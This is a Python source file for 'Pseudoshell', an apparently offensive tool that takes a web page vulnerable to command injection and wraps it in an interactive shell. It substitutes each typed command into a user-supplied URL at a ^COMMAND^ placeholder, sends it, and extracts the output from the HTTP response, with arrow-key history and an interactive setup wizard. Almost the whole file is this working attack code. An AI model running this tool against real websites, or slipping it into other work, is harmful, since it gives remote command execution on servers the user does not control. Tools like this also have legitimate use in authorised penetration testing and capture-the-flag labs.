import requests
import sys
import termios
import tty
import subprocess
import argparse
import encoders

class Injector:
    def __init__(self, url, request_type, encoding_type=None, body=None, extractor_pairs=[]):
        self.url = url
        self.filled_url = ""
        self.request_type = request_type
        self.body = body
        self.filled_body = ""
        self.encoding_type = encoding_type
        self.extractor_pairs = extractor_pairs
    def inject_command(self, command):
        command = encoders.urlencode(command)
        self.filled_url = self.url.replace("^COMMAND^", command)
        if self.body != None:
            self.filled_body = self.body.replace("^COMMAND^", command)
    def send_command(self, command):
        self.inject_command(command)
        response = requests.get(self.filled_url)
        response = response.text
        for pair in self.extractor_pairs:
            if pair[0] in response and pair[1] in response:
                response = response.split(pair[0])[1]
                response = response.split(pair[1])[0]
        response += "\n"
        response = response.replace("<br/>", "\n")
        response = response.replace("&nbsp;", " ")
        return response

class History:
    def __init__(self):
        self.history = []
        self.pointer = 0
    def reset(self):
        self.pointer = len(self.history)
    def add_to_history(self, new_command):
        if ";" in new_command:
            for command in new_command.split(";"):
                self.history.append(command)
        else:
            self.history.append(new_command)
        self.reset()
    def previous_history(self):
        self.pointer -= 1
        if self.pointer < 0:
            self.pointer = 0
        if len(self.history) == 0:
            return ""
        return self.history[self.pointer]
    def next_history(self):
        self.pointer += 1
        if self.pointer >= len(self.history):
            self.pointer = len(self.history)
            return ""
        if len(self.history) == 0:
            return ""
        return self.history[self.pointer]
    def dump_history_command(self):
        if len(self.history) == 0:
            return ";"
        history_dump = "\\n".join(self.history).replace("\n", "\\n")
        history_dump = 'echo "' + history_dump + '"'
        return history_dump
    def clear_history_command(self):
        self.history = []
        self.pointer = 0
        return "return 0"

class Shell:
    def __init__(self, shell_callback):
        self.shell_callback = shell_callback
        self.history = History()
        self.current_command = ""
        self.fd = sys.stdin.fileno()
        self.old_settings = termios.tcgetattr(self.fd)
        tty.setraw(self.fd)
        sys.stdout.write('\x1b[?1000l')
        sys.stdout.write('\x1b[?1002l')
        sys.stdout.write('\x1b[?1003l')
        sys.stdout.write('\x1b[?1006l')
        sys.stdout.flush()
    def clear_command(self):
        sys.stdout.write("\b \b" * len(self.current_command))
        sys.stdout.flush()
        self.current_command = ""
    def get_next_command(self):
        while True:
            ch = sys.stdin.read(1)
            if ch == "\r":
                sys.stdout.write("\r\n")
                sys.stdout.flush()
                return
            elif ch == "\x7f":
                if len(self.current_command) > 0:
                    self.current_command = self.current_command[:-1]
                    ch = "\b \b"
                else:
                    ch = ""
            elif ch == "\x03":
                exit()
            if ch == "\x1b":
                ch += sys.stdin.read(1)
                ch += sys.stdin.read(1)
                if ch != "\x1b[B" and ch != "\x1b[A":
                    continue
            if ch == "\x1b[B":
                self.clear_command()
                self.current_command = self.history.next_history()
                sys.stdout.write(self.current_command)
                sys.stdout.flush()
                continue
            elif ch == "\x1b[A":
                self.clear_command()
                self.current_command = self.history.previous_history()
                sys.stdout.write(self.current_command)
                sys.stdout.flush()
                continue
            sys.stdout.write(ch)
            sys.stdout.flush()
            if ch != "\b \b":
                self.current_command += ch
    def run(self):
        print("Welcome to psuedoshell (Press Ctrl+C to exit)\n\r")
        while self.current_command != "exit":
            self.current_command = ""
            sys.stdout.write("> ")
            sys.stdout.flush()
            self.get_next_command()
            truecommand = self.current_command
            self.current_command = self.current_command.replace("history dump", self.history.dump_history_command())
            if "history clear" in self.current_command:
                self.current_command = self.history.clear_history_command()
            try:
                output = self.shell_callback(self.current_command)
            except:
                output = "\r"
            sys.stdout.write(output.replace("\n", "\n\r"))
            sys.stdout.flush()
            self.history.add_to_history(truecommand)

def shell_run_command(command):
    return subprocess.check_output(command, shell=True, text=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="Pseudoshell", description="A smart shell that isn't a shell, but can be used to turn single command injections on webpages into a shell")
    parser.add_argument("--wizard", help="enables the wizard to give an interactive setup", action="store_true")
    args = parser.parse_args()
    shell = None
    if args.wizard:
        print("Welcome to the pseudo shell wizard, here we will help you set up your shell")
        print("")
        print("When answering the following questions, please enter ^COMMAND^ at the place you want your command injected")
        print("The ^COMMAND^ will then be replaced by your command when sending it")
        print("Right lets begin!")
        print("")
        url = input("What is the url: ")
        method = input("What method is the request: ")
        body = None
        if method == "PUT" or method == "POST":
            body = input("What is the body of the request")
        extractors = []
        more = "y"
        while more.lower() == "y":
            startextractor = input("What is the start extractor: ")
            endextractor = input("What is the end extractor: ")
            extractors.append((startextractor, endextractor))
            more = input("Are there more extractors (Y/N): ")
        injector = Injector(url, method, body=body, extractor_pairs=extractors)
        shell = Shell(injector.send_command)
    else:
        shell = Shell(shell_run_command)
    shell.run()